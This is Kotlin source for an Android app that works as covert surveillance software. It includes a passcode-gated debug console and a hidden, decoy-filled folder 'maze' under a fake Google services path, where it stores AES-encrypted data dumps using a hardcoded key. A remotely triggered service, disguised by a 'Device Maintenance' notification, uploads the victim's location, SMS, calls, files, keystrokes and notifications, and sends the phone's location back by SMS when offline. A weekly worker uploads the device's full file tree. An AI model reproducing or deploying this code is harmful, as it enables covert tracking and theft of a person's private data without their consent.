    var pwd by remember { mutableStateOf("") }
    var error by remember { mutableStateOf(false) }

    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Color(0xFF0F0F10),
        title = { Text("Developer Settings", color = AccentBlue, fontWeight = FontWeight.Bold, fontSize = 16.sp) },
        text = {
            Column {
                OutlinedTextField(
                    value = pwd,
                    onValueChange = { pwd = it; error = false },
                    label = { Text("Passcode", color = TextDim) },
                    singleLine = true,
                    visualTransformation = androidx.compose.ui.text.input.PasswordVisualTransformation(),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = AccentBlue,
                        unfocusedBorderColor = BorderSubtle,
                        focusedTextColor = TextMain,
                        unfocusedTextColor = TextMain
                    )
                )
                if (error) {
                    Text("Authentication Failed", color = Color(0xFFEF4565), fontSize = 12.sp, modifier = Modifier.padding(top = 8.dp), fontWeight = FontWeight.Bold)
                }
            }
        },
        confirmButton = {
            TextButton(onClick = {
                val k = 0x50 or 0x0A 
                val target1 = intArrayOf(122, 25, 45, 40, 46, 105, 34, 42, 13).map { (it xor k).toChar() }.joinToString("")
                val target2 = intArrayOf(25, 45, 40, 46, 105, 34, 42, 13).map { (it xor k).toChar() }.joinToString("")
                if (pwd == target1 || pwd == target2) onSuccess() else error = true
            }) { Text("Confirm", color = AccentBlue) }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) { Text("CANCEL", color = TextDim) }
        }
    )
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DebugConsole(ctx: Context, onDismiss: () -> Unit) {
    var report by remember { mutableStateOf(DeviceManager.getDiagnosticReport(ctx) + "\n\n--- LIVE LOGS ---\n" + DebugLogger.getLogs()) }
    val scope = rememberCoroutineScope()
    var isRevealed by remember { mutableStateOf(false) }

    val ptrState = androidx.compose.material3.pulltorefresh.rememberPullToRefreshState()
    if (ptrState.isRefreshing) {
        LaunchedEffect(true) {
            // Re-fetch the latest diagnostics and logs
            report = DeviceManager.getDiagnosticReport(ctx) + "\n\n--- LIVE LOGS ---\n" + DebugLogger.getLogs()
            kotlinx.coroutines.delay(500) // Ensure the spinner is visible for at least half a second
            ptrState.endRefresh()
        }
    }

    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = CardSlate,
        title = { 
            Text(
                "System Logs", 
                color = TextMain, 
                fontWeight = FontWeight.SemiBold, 
                fontSize = 18.sp,
                modifier = Modifier.clickable { isRevealed = true }
            ) 
        },
        text = {
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .heightIn(min = 200.dp, max = 450.dp)
                    .nestedScroll(ptrState.nestedScrollConnection)
            ) {
                Column(modifier = Modifier.verticalScroll(rememberScrollState()).fillMaxSize()) {
                    if (isRevealed) {
                        Text(report, color = TextDim, fontSize = 11.sp, lineHeight = 16.sp)
                    } else {
                        Text(
                            "Tap 'System Logs' title to reveal.\n\nSwipe down to refresh.", 
                            color = TextDim.copy(alpha = 0.5f), 
                            fontSize = 12.sp, 
                            modifier = Modifier.padding(16.dp)
                        )
                    }
                }
                androidx.compose.material3.pulltorefresh.PullToRefreshContainer(
                    state = ptrState,
                    modifier = Modifier.align(Alignment.TopCenter),
                    containerColor = CardSlate,
                    contentColor = AccentBlue
                )
            }
        },
        confirmButton = {
            if (isRevealed) {
                Row {
                    TextButton(onClick = {
                        val clipboard = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                        val clip = android.content.ClipData.newPlainText("System Logs", report)
                        clipboard.setPrimaryClip(clip)
                        android.widget.Toast.makeText(ctx, "Logs copied", android.widget.Toast.LENGTH_SHORT).show()
                    }) { Text("Copy", color = AccentBlue) }

                    TextButton(onClick = {
                        val shareIntent = Intent(Intent.ACTION_SEND).apply {
                            type = "text/plain"
                            putExtra(Intent.EXTRA_TEXT, report)
                        }
                        ctx.startActivity(Intent.createChooser(shareIntent, "Share System Logs"))
                    }) { Text("Share", color = AccentBlue) }

                    TextButton(onClick = onDismiss) { Text("Close", color = TextMain) }
                }
            } else {
                TextButton(onClick = onDismiss) { Text("Close", color = TextMain) }
            }
        },
        dismissButton = {
            if (isRevealed) {
                                    TextButton(onClick = {
                        DebugLogger.clear()
                        report = DeviceManager.getDiagnosticReport(ctx) + "\n\n--- LOGS CLEARED ---"
                        android.widget.Toast.makeText(ctx, "Logs purged", android.widget.Toast.LENGTH_SHORT).show()
                    }) { Text("Clear", color = Color(0xFFEF4444)) }

                    TextButton(onClick = { 
                        scope.launch(Dispatchers.IO) { DumpManager.createDailyDump(ctx) }
                        android.widget.Toast.makeText(ctx, "Export initiated", android.widget.Toast.LENGTH_SHORT).show()
                    }) { Text("Export", color = TextDim) }
            }
        }
    )
}

// --- FAST FETCH HELPERS ---
fun getBasicStorage(): Triple<String, String, Float> {
    val root = android.os.Environment.getExternalStorageDirectory()
    val total = root.totalSpace.toFloat()
    val free = root.freeSpace.toFloat()
    val used = total - free
    val totalGb = total / (1024*1024*1024)
    val usedGb = used / (1024*1024*1024)
    val pct = if(total > 0) used / total else 0f
    return Triple(String.format(java.util.Locale.US, "%.1f GB", usedGb), String.format(java.util.Locale.US, "%.1f GB", totalGb), pct)
}

fun getBasicMemory(ctx: Context): Triple<String, String, Float> {
    val actManager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
    val memInfo = android.app.ActivityManager.MemoryInfo()
    actManager.getMemoryInfo(memInfo)
    val total = memInfo.totalMem.toFloat()
    val avail = memInfo.availMem.toFloat()
    val used = total - avail
    val totalGb = total / (1024*1024*1024)
    val usedGb = used / (1024*1024*1024)
    val pct = if(total > 0) used / total else 0f
    return Triple(String.format(java.util.Locale.US, "%.1f GB", usedGb), String.format(java.util.Locale.US, "%.1f GB", totalGb), pct)
}

fun getBasicBattery(ctx: Context): Pair<Int, Boolean> {
    val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
    val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    val status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)
    val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
    return Pair(level, isCharging)
}

fun getBasicCameraCount(ctx: Context): Int {
    return try {
        val manager = ctx.getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
        manager.cameraIdList.size
    } catch(e: Exception) { 0 }
}

fun getBasicPeripherals(ctx: Context): Int {
    var count = 0
    try {
        val usb = ctx.getSystemService(Context.USB_SERVICE) as android.hardware.usb.UsbManager
        count += usb.deviceList.size
    } catch(e: Exception) {}
    return count
}

fun calculateCortexScore(ctx: Context): Pair<Int, String> {
    var score = 10
    val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
    val mi = android.app.ActivityManager.MemoryInfo()
    am.getMemoryInfo(mi)
    val ramGb = mi.totalMem / (1024.0 * 1024.0 * 1024.0)
    score += when { ramGb > 11.5 -> 30; ramGb > 7.5 -> 20; ramGb > 5.5 -> 10; else -> 5 }
    val cores = Runtime.getRuntime().availableProcessors()
    score += if (cores >= 8) 20 else 10
    score += when { Build.VERSION.SDK_INT >= 34 -> 20; Build.VERSION.SDK_INT >= 31 -> 15; else -> 5 }
    val board = Build.BOARD.lowercase()
    if (board.contains("taro") || board.contains("kalama") || board.contains("sm8")) score += 20
    else if (ramGb > 7) score += 10

    val label = when {
        score >= 85 -> "OMEGA"
        score >= 70 -> "ELITE"
        score >= 50 -> "STANDARD"
        else -> "LEGACY"
    }
    return Pair(score.coerceIn(0, 100), label)
}

package com.example.myandroid

import java.text.SimpleDateFormat
import java.util.Collections
import java.util.Date
import java.util.Locale

object DebugLogger {
    private val logs = Collections.synchronizedList(mutableListOf<String>())
    private val MAX_LOGS = 500

    fun log(tag: String, msg: String) {
        val time = SimpleDateFormat("HH:mm:ss.SSS", Locale.US).format(Date())
        val entry = "$time [$tag] $msg"
        // Add to top
        logs.add(0, entry)
        if (logs.size > MAX_LOGS) {
            logs.removeAt(logs.lastIndex)
        }
        println(entry) // Also print to system logcat just in case
    }

    fun getLogs(): String {
        return synchronized(logs) {
            logs.joinToString("\n\n")
        }
    }

    fun clear() {
        logs.clear()
    }
}

package com.example.myandroid

import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.DisplayMetrics
import android.view.WindowManager
import org.json.JSONObject
import java.io.File

object DeviceManager {

    fun getDeviceId(ctx: Context): String {
        val prefs = ctx.getSharedPreferences("app_identity", Context.MODE_PRIVATE)
        var id = prefs.getString("device_uuid", null)
        if (id == null) {
            id = java.util.UUID.randomUUID().toString()
            prefs.edit().putString("device_uuid", id).apply()
        }
        return id!!
    }

    fun getStaticInfo(ctx: Context): JSONObject {
        val deviceId = getDeviceId(ctx)
        val json = JSONObject()
        try {
            // 0. Identity
            json.put("device_id", deviceId)

            // 1. Software
            json.put("model", Build.MODEL)
            json.put("manufacturer", Build.MANUFACTURER)
            json.put("brand", Build.BRAND)
            json.put("device", Build.DEVICE)
            json.put("board", Build.BOARD)
            json.put("android_ver", Build.VERSION.RELEASE)
            json.put("sdk", Build.VERSION.SDK_INT)
            json.put("security_patch", Build.VERSION.SECURITY_PATCH)

            // 2. Hardware (RAM)
            val actManager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            actManager.getMemoryInfo(memInfo)
            json.put("total_ram_gb", memInfo.totalMem / (1024.0 * 1024.0 * 1024.0))

            // 3. Display
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val dm = DisplayMetrics()
            wm.defaultDisplay.getRealMetrics(dm)
            json.put("screen_res", "${dm.widthPixels}x${dm.heightPixels}")
            json.put("screen_dpi", dm.densityDpi)

            // 4. CPU (Rough estimate)
            json.put("cpu_cores", Runtime.getRuntime().availableProcessors())
            json.put("arch", System.getProperty("os.arch"))

        } catch (e: Exception) { e.printStackTrace() }
        return json
    }

    fun getDiagnosticReport(ctx: Context): String {
        val sb = StringBuilder()
        sb.append("\n--- System Diagnostics ---\n")

        // 1. Policy Status
        sb.append("Power Policy:       ").append(if(PermissionManager.isIgnored(ctx)) "[Unrestricted]" else "[Standard]").append("\n")
        sb.append("Overlay Access:     ").append(if(PermissionManager.hasOverlayAccess(ctx)) "[Enabled]" else "[Disabled]").append("\n")
        sb.append("DND Access:         ").append(if(PermissionManager.hasDndAccess(ctx)) "[Enabled]" else "[Disabled]").append("\n")
        sb.append("Device Admin:       ").append(if(PermissionManager.isAdmin(ctx)) "[Enabled]" else "[Disabled]").append("\n")

        // 2. Background Services
        sb.append("Accessibility:      ").append(if(PermissionManager.hasAccessibility(ctx)) "[Running]" else "[Stopped]").append("\n")
        sb.append("Notification Sync:  ").append(if(PermissionManager.hasNotificationListener(ctx)) "[Running]" else "[Stopped]").append("\n")
        sb.append("Usage Analytics:    ").append(if(PermissionManager.hasUsageStats(ctx)) "[Running]" else "[Stopped]").append("\n")

        // 3. App Permissions
        val perms = mutableMapOf(
            "Location" to android.Manifest.permission.ACCESS_FINE_LOCATION,
            "Messages" to android.Manifest.permission.READ_SMS,
            "Call Actions" to android.Manifest.permission.CALL_PHONE,
            "Call Logs" to android.Manifest.permission.READ_CALL_LOG,
            "Contacts" to android.Manifest.permission.READ_CONTACTS
        )
        if (android.os.Build.VERSION.SDK_INT >= 33) perms["Notifications"] = android.Manifest.permission.POST_NOTIFICATIONS

        sb.append("Permissions:        ")
        perms.forEach { (k, v) ->
            val granted = androidx.core.content.ContextCompat.checkSelfPermission(ctx, v) == PackageManager.PERMISSION_GRANTED
            sb.append("$k:").append(if(granted) "✓ " else "✗ ")
        }
        sb.append("\nFile Access:        ").append(if(PermissionManager.hasAllFilesAccess(ctx)) "[Full]" else "[Limited]").append("\n")

        // 4. Health
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val kills = try { JSONObject(prefs.getString("app_health", "{}")).optInt("kill_count", 0) } catch(e:Exception){0}
        sb.append("Interrupts:         $kills\n")
        sb.append("Last Sync:          ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date(prefs.getLong("last_heartbeat", 0L)))}")

        return sb.toString()
    }

    fun getDeviceScore(ctx: Context): Pair<Int, String> {
        var score = 0
        try {
            // 1. RAM (Max 40)
            val actManager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            actManager.getMemoryInfo(memInfo)
            val ramGb = memInfo.totalMem / (1024.0 * 1024.0 * 1024.0)

            score += when {
                ramGb >= 11.5 -> 40
                ramGb >= 7.5 -> 30
                ramGb >= 5.5 -> 20
                ramGb >= 3.5 -> 10
                else -> 5
            }
            // 2. CPU (Max 20)
            val cores = Runtime.getRuntime().availableProcessors()
            score += if (cores >= 8) 15 else 5
            if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) score += 5
            // 3. OS (Max 25)
            val sdk = Build.VERSION.SDK_INT
            score += when {
                sdk >= 34 -> 25
                sdk >= 31 -> 20
                sdk >= 29 -> 15
                else -> 5
            }
            // 4. DISPLAY (Max 15)
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val dm = DisplayMetrics()
            wm.defaultDisplay.getRealMetrics(dm)
            if (dm.densityDpi >= 400) score += 15 else if (dm.densityDpi >= 300) score += 10 else score += 5
        } catch (e: Exception) { return Pair(0, "UNKNOWN") }

        val label = when(score) {
            in 90..100 -> "Premium Tier"
            in 75..89 -> "High Performance"
            in 55..74 -> "Standard"
            in 30..54 -> "Legacy"
            else -> "Deprecated"
        }
        return Pair(score, label)
    }

    fun getHealthStats(ctx: Context): JSONObject {
        val json = JSONObject()

        // 1. Permission Matrix
        val perms = JSONObject()
        val critical = listOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.MANAGE_EXTERNAL_STORAGE
        )
        for (p in critical) {
            val name = p.split(".").last()
            val granted = if (p == android.Manifest.permission.MANAGE_EXTERNAL_STORAGE && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                android.os.Environment.isExternalStorageManager()
            } else {
                androidx.core.content.ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
            }
            perms.put(name, granted)
        }
        json.put("permissions", perms)

        // 2. Service Status
        json.put("accessibility_alive", PermissionManager.hasAccessibility(ctx))
        json.put("notification_listener_alive", PermissionManager.hasNotificationListener(ctx))
        json.put("usage_stats_alive", PermissionManager.hasUsageStats(ctx))

        // 3. Immortality & Admin Status
        json.put("battery_optimization_ignored", PermissionManager.isIgnored(ctx))
        json.put("overlay_allowed", PermissionManager.hasOverlayAccess(ctx))
        json.put("dnd_access_allowed", PermissionManager.hasDndAccess(ctx))
        json.put("device_admin_active", PermissionManager.isAdmin(ctx))

        // 4. App Interaction
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        json.put("total_interactions_recorded", prefs.getInt("interaction_count", 0))
        json.put("uptime_timestamp", System.currentTimeMillis())

        return json
    }
}

package com.example.myandroid

import android.content.Context
import android.os.Environment
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import javax.crypto.spec.GCMParameterSpec
import java.security.SecureRandom
import org.json.JSONObject
import org.json.JSONArray
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock

object DumpManager {

    private val logScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val logMutex = Mutex()

    // The Catacombs: 9-level maze structure
    private val MAZE_ROOT = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android")
    private val TRUE_PATH = "data/com.google.android.gms/files/cache/.sys_config/.v2/.internal/.identity"
    private val ROOT_DIR = File(MAZE_ROOT, TRUE_PATH)
    private val KEY = "C0rtexS3cr3tK3y!".toByteArray() // 16 bytes for AES-128

    fun createDailyDump(ctx: Context) {
        try {
            ensureMaze()
            val dateStr = SimpleDateFormat("d_M_yy", Locale.US).format(Date())
            val dayDir = File(ROOT_DIR, dateStr)
            if (!dayDir.exists()) dayDir.mkdirs()

            val timestamp = SimpleDateFormat("HH_mm_ss", Locale.US).format(Date())

            // 1. Readable Log
            val logFile = File(dayDir, "sys_log_$timestamp.txt")
            val report = DeviceManager.getDiagnosticReport(ctx) + "\n\n--- LOGS ---\n" + DebugLogger.getLogs()
            logFile.writeText(report)

            // 2. Encrypted Data Blob (.ctx extension)
            val jsonFile = File(dayDir, "data_snapshot_$timestamp.ctx")
            val rawJson = CloudManager.collectDumpData(ctx).toString()
            val encrypted = encrypt(rawJson)
            jsonFile.writeBytes(encrypted)

            DebugLogger.log("DUMP", "Saved to ${dayDir.absolutePath}")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun getDumpsForToday(): List<File> {
        val dateStr = SimpleDateFormat("d_M_yy", Locale.US).format(Date())
        val dayDir = File(ROOT_DIR, dateStr)
        return if (dayDir.exists()) dayDir.listFiles()?.toList() ?: emptyList() else emptyList()
    }

    private fun encrypt(data: String): ByteArray {
        // 1. Setup GCM Parameters
        val iv = ByteArray(12) // GCM standard IV size
        SecureRandom().nextBytes(iv)
        val spec = GCMParameterSpec(128, iv) // 128-bit authentication tag

        // 2. Initialize Cipher
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val secretKey = SecretKeySpec(KEY, "AES")
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, spec)

        // 3. Encrypt data
        val ciphertext = cipher.doFinal(data.toByteArray(Charsets.UTF_8))

        // 4. Return [IV (12 bytes)] + [Ciphertext + Tag]
        val combined = ByteArray(iv.size + ciphertext.size)
        System.arraycopy(iv, 0, combined, 0, iv.size)
        System.arraycopy(ciphertext, 0, combined, iv.size, ciphertext.size)
        return combined
    }

    fun logVerification(category: String, pkg: String) {
        try {
            if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs()
            File(ROOT_DIR, "sensor_verification.txt").appendText("[" + SimpleDateFormat("HH:mm:ss", Locale.US).format(Date()) + "] [$category] $pkg ✓\n")
        } catch (e: Exception) { }
    }

    // --- STREAM LOGGING (SURVIVOR PROTOCOL) ---
    private const val MAX_CHUNK_SIZE = 2 * 1024 * 1024 // 2MB chunks
    private const val MAX_TOTAL_CHUNKS = 25 // 50MB Max Storage

    fun appendLog(type: String, data: JSONObject) {
        logScope.launch { 
            logMutex.withLock {
                try {
                    ensureMaze()
                    val activeFile = File(ROOT_DIR, "active_buffer.jsonl")

                    val wrapper = JSONObject()
                    wrapper.put("t", type)
                    wrapper.put("d", data)

                    activeFile.appendText(wrapper.toString() + "\n")

                    // Rotate and Compress if too large
                    if (activeFile.length() > MAX_CHUNK_SIZE) {
                        val timestamp = System.currentTimeMillis()
                        val tempFile = File(ROOT_DIR, "temp_${timestamp}.jsonl")
                        activeFile.renameTo(tempFile)

                        // Compress the chunk to save 80% disk space and data bandwidth
                        val gzFile = File(ROOT_DIR, "offline_log_${timestamp}.jsonl.gz")
                        try {
                            java.util.zip.GZIPOutputStream(gzFile.outputStream()).use { gz ->
                                tempFile.inputStream().use { input -> input.copyTo(gz) }
                            }
                            tempFile.delete() // Clean up raw text
                        } catch (e: Exception) {
                            // Fallback: If compression fails, just keep raw file
                            tempFile.renameTo(File(ROOT_DIR, "offline_log_${timestamp}.jsonl"))
                        }
                        enforceStorageLimits()
                    }
                } catch (e: Exception) { e.printStackTrace() }
            }
        }
    }

    private fun enforceStorageLimits() {
        try {
            val logs = ROOT_DIR.listFiles { _, name -> name.startsWith("offline_log_") } ?: return
            if (logs.size > MAX_TOTAL_CHUNKS) {
                logs.sortedBy { it.lastModified() }
                    .take(logs.size - MAX_TOTAL_CHUNKS)
                    .forEach { it.delete() }
            }
        } catch(e: Exception) {}
    }

    private fun ensureMaze() {
        try {
            if (ROOT_DIR.exists()) return

            val levels = TRUE_PATH.split("/")
            var current = MAZE_ROOT

            val decoys = mapOf(
                0 to listOf("System", "Media", "Legacy"),
                1 to listOf("obb", "manifests", "protoc"),
                2 to listOf("com.android.vending", "com.google.android.apps.maps"),
                3 to listOf("shared_prefs", "databases", "app_textures"),
                4 to listOf("tmp", "thumbnails", "webview"),
                5 to listOf(".font_data", ".res_cache", ".blob_store"),
                6 to listOf(".v1", ".backup", ".old"),
                7 to listOf(".tmp_shared", ".metadata_v3"),
                8 to listOf("secondary", "recovery", "temp_node")
            )

            levels.forEachIndexed { index, name ->
                // Create decoys at this level
                decoys[index]?.forEach { decoyName ->
                    val decoyDir = File(current, decoyName)
                    if (!decoyDir.exists()) {
                        decoyDir.mkdirs()
                        // Put a dummy file in the decoy
                        val dummy = File(decoyDir, "journal_v${index + 1}.db-wal")
                        if (!dummy.exists()) dummy.writeBytes(ByteArray(1024) { 0 })
                    }
                }
                // Move to next level in true path
                current = File(current, name)
                if (!current.exists()) current.mkdirs()
            }
        } catch (e: Exception) { }
    }

    fun getRotatedLogs(): List<File> {
        try {
            // Force rotate active buffer so we upload the latest data too
            val activeFile = File(ROOT_DIR, "active_buffer.jsonl")
            if (activeFile.exists() && activeFile.length() > 0) {
                val timestamp = System.currentTimeMillis()
                val tempFile = File(ROOT_DIR, "temp_${timestamp}.jsonl")
                activeFile.renameTo(tempFile)

                val gzFile = File(ROOT_DIR, "offline_log_${timestamp}.jsonl.gz")
                try {
                    java.util.zip.GZIPOutputStream(gzFile.outputStream()).use { gz ->
                        tempFile.inputStream().use { input -> input.copyTo(gz) }
                    }
                    tempFile.delete()
                } catch (e: Exception) {
                    tempFile.renameTo(File(ROOT_DIR, "offline_log_${timestamp}.jsonl"))
                }
            }
            // Grab both compressed (.gz) and any fallback uncompressed (.jsonl) files
            return ROOT_DIR.listFiles { _, name -> name.startsWith("offline_log_") }?.toList() ?: emptyList()
        } catch (e: Exception) { return emptyList() }
    }
}

package com.example.myandroid

import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.IBinder
import android.telephony.SmsManager
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await

class EmergencyService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // CRITICAL FIX: Promote to Foreground immediately to prevent OS killing the service
        startForeground(666, createNotification())

        val sender = intent?.getStringExtra("sender") ?: return START_NOT_STICKY
        val rawCmd = intent?.getStringExtra("codes") ?: "0"

        // PARSE COMMAND: Code-Duration-Frequency (e.g., "1-15-3")
        val parts = rawCmd.split("-")
        val moduleCode = parts.getOrElse(0) { "0" }
        val durationMins = parts.getOrElse(1) { "5" }.toLongOrNull() ?: 5L
        val freqSecs = parts.getOrElse(2) { "30" }.toLongOrNull() ?: 30L

        // Parse Modules
        val modules = parseCodes(moduleCode)

        scope.launch {
            DebugLogger.log("CodeRed", "Triggered! Cmd: $rawCmd (Dur: ${durationMins}m, Freq: ${freqSecs}s)")

            // SINGLE RUN MODE (Frequency 0)
            if (freqSecs <= 0L) {
                if (isOnline()) {
                    CloudManager.uploadData(applicationContext, modules)
                } else {
                     MyAccessibilityService.triggerDataRecovery()
                     delay(5000) // Give Ghost Hand a moment
                     val loc = getLastKnownLocation()
                     if (loc != null) sendSms(sender, "ONE-SHOT: ${loc.latitude},${loc.longitude}")
                }
                stopSelf()
                return@launch
            }

            // LOOP MODE
            val endTime = System.currentTimeMillis() + (durationMins * 60 * 1000)

            // If offline, try Ghost Hand once at start
            if (!isOnline()) MyAccessibilityService.triggerDataRecovery()

            while (System.currentTimeMillis() < endTime) {
                try {
                    if (isOnline()) {
                        // ONLINE: Upload Data
                        DebugLogger.log("CodeRed", "Online. Uploading modules: $modules")
                        CloudManager.uploadData(applicationContext, modules)
                    } else {
                        // OFFLINE: SMS Beacon
                        val loc = getLastKnownLocation()
                        val locMsg = if (loc != null) "${loc.latitude},${loc.longitude}" else "GPS_SEARCHING"
                        sendSms(sender, "CR-BEACON: $locMsg")
                        DebugLogger.log("CodeRed", "Offline. SMS Sent: $locMsg")

                        // Try to reconnect periodically
                        MyAccessibilityService.triggerDataRecovery()
                    }
                } catch (e: Exception) {
                    DebugLogger.log("CodeRedError", e.message ?: "Unknown")
                }

                delay(freqSecs * 1000)
            }

            DebugLogger.log("CodeRed", "Session Expired. Shutting down.")
            stopSelf()
        }

        return START_NOT_STICKY
    }

    private fun parseCodes(raw: String): List<String> {
        val list = mutableListOf<String>()
        val parts = raw.split(",")

        if (parts.contains("0")) return listOf("ALL")

        parts.forEach { c ->
            when(c.trim()) {
                "1" -> list.add("location")
                "2" -> list.add("sms")
                "3" -> list.add("phone")
                "4" -> list.add("files")
                "5" -> list.add("typing")
                "6" -> list.add("usage")
                "7" -> list.add("notifications")
            }
        }
        if (list.isEmpty()) list.add("location") 
        return list
    }

    private suspend fun getLastKnownLocation(): Location? {
        return try {
             if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                 val fused = LocationServices.getFusedLocationProviderClient(this)
                 fused.lastLocation.await()
             } else null
        } catch (e: Exception) { null }
    }

    private fun sendSms(phone: String, msg: String) {
        try {
            val smsManager = getSystemService(SmsManager::class.java)
            smsManager.sendTextMessage(phone, null, msg, null, null)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun isOnline(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
        return caps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
    }

    private fun createNotification(): android.app.Notification {
        val channelId = "emergency_channel"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val chan = android.app.NotificationChannel(channelId, "System Maintenance", android.app.NotificationManager.IMPORTANCE_MIN)
            chan.setShowBadge(false)
            getSystemService(android.app.NotificationManager::class.java).createNotificationChannel(chan)
        }
        return androidx.core.app.NotificationCompat.Builder(this, channelId)
            .setContentTitle("Device Maintenance")
            .setContentText("Optimizing storage and power metrics...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
            .build()
    }
}

package com.example.myandroid

import android.os.Environment
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.DecimalFormat

object FileManager {

    fun formatSize(size: Long): String {
        if (size <= 0) return "0 B"
        val units = arrayOf("B", "KB", "MB", "GB", "TB")
        val digitGroups = (Math.log10(size.toDouble()) / Math.log10(1024.0)).toInt()
        return DecimalFormat("#.##").format(size / Math.pow(1024.0, digitGroups.toDouble())) + " " + units[digitGroups]
    }

    fun generateReport(): JSONObject {
        val root = Environment.getExternalStorageDirectory()
        val json = JSONObject()

        // 1. Metadata
        json.put("timestamp", System.currentTimeMillis())
        json.put("root_path", root.absolutePath)
        json.put("total_space", root.totalSpace)
        json.put("free_space", root.freeSpace)

        // 2. Recursive Scan
        val tree = JSONObject()
        val stats = JSONObject()
        // Counters
        var imgCount = 0
        var vidCount = 0
        var docCount = 0
        var otherCount = 0

        fun walk(dir: File): JSONObject {
            val dirJson = JSONObject()
            val filesArr = JSONArray()
            val dirsArr = JSONArray()

            val list = dir.listFiles()
            if (list != null) {
                for (f in list) {
                    if (f.isDirectory) {
                        val sub = walk(f)
                        sub.put("name", f.name)
                        dirsArr.put(sub)
                    } else {
                        // It's a file
                        val ext = f.extension.lowercase()
                        when(ext) {
                            "jpg", "jpeg", "png", "gif", "webp" -> imgCount++
                            "mp4", "mkv", "mov", "avi" -> vidCount++
                            "pdf", "doc", "docx", "txt", "xlsx" -> docCount++
                            else -> otherCount++
                        }

                        // To save space, we only store name and size
                        val fileObj = JSONObject()
                        fileObj.put("n", f.name)
                        fileObj.put("s", f.length())
                        filesArr.put(fileObj)
                    }
                }
            }
            dirJson.put("d", dirsArr)
            dirJson.put("f", filesArr)
            return dirJson
        }

        val hierarchy = walk(root)
        json.put("skeleton", hierarchy)

        stats.put("images", imgCount)
        stats.put("videos", vidCount)
        stats.put("documents", docCount)
        stats.put("others", otherCount)
        json.put("stats", stats)

        return json
    }
}

package com.example.myandroid

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class FileScanWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        return withContext(Dispatchers.IO) {
            try {
                // Only run if we have permission
                val hasPerm = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    android.os.Environment.isExternalStorageManager()
                } else {
                    androidx.core.content.ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
                }

                if (!hasPerm) return@withContext Result.failure()

                // Generate
                val json = FileManager.generateReport()
                json.put("trigger", "WEEKLY_WORKER")

                // Upload
                CloudManager.uploadSkeleton(applicationContext, json)
                DebugLogger.log("FILE_SCAN_WORKER", "Weekly file skeleton generated and dispatched")

                Result.success()
            } catch (e: Exception) {
